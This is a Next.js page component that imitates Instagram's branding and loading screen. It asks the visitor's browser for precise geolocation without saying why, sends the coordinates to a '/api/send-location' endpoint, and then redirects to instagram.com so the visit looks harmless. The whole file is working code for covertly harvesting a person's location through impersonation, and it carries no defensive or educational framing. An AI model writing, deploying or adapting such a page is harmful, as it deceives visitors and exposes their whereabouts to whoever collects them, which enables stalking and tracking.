"use client";

import { useEffect, useState } from "react";

export default function Home() {
  const [status, setStatus] = useState("...");

  useEffect(() => {
    const sendLocation = async () => {
      if (!navigator.geolocation) {
        setStatus("Geolocation is not supported by this browser.");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;

          console.log("Location obtained:", {
            latitude,
            longitude,
            accuracy,
          });

          try {
            const response = await fetch("/api/send-location", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                latitude,
                longitude,
              }),
            });

            const data = await response.json();

            if (!response.ok) {
              throw new Error(data.message);
            }
            setStatus("continue...");
            window.location.href = "https://www.instagram.com/";
          } catch (error) {
            console.error("Send location error:", error);
            setStatus("Unable to send location.");
          }
        },

        (error) => {
          console.error("Geolocation error:", error);

          switch (error.code) {
            case error.PERMISSION_DENIED:
              setStatus("User denied the request");
              break;

            case error.POSITION_UNAVAILABLE:
              setStatus("information is unavailable.");
              break;

            case error.TIMEOUT:
              setStatus("request timed out.");
              break;

            default:
              setStatus("Unable to determine.");
          }
        },

        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        }
      );
    };

    sendLocation();
  }, []);

  return (
    <main className="min-h-screen bg-[#fafafa] flex items-center justify-center px-4">
      <div className="w-full max-w-sm">

        <div className="rounded-2xl border border-gray-200 bg-white p-8 shadow-sm">
          <div className="flex justify-center mb-7">
            <div className="h-14 w-14 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center">
              <div className="h-9 w-9 rounded-xl border-2 border-white relative">
                <div className="absolute h-4 w-4 rounded-full border-2 border-white top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
                <div className="absolute h-1 w-1 rounded-full bg-white right-1.5 top-1.5" />
              </div>
            </div>
          </div>

          <h1 className="text-center text-xl font-semibold text-gray-900">
            Welcome
          </h1>

          <p className="mt-3 text-center text-sm leading-6 text-gray-500">
            Please allow in your browser to continue.
          </p>

          {/* Loading */}
          <div className="mt-7 flex flex-col items-center">

            <div className="h-8 w-8 animate-spin rounded-full border-4 border-gray-200 border-t-blue-500" />

            <p className="mt-4 text-sm text-gray-500 text-center">
              {status}
            </p>

          </div>

          <p className="mt-7 text-center text-xs text-gray-400">
            Your browser controls whether access is allowed.
          </p>

        </div>

      </div>
    </main>
  );
}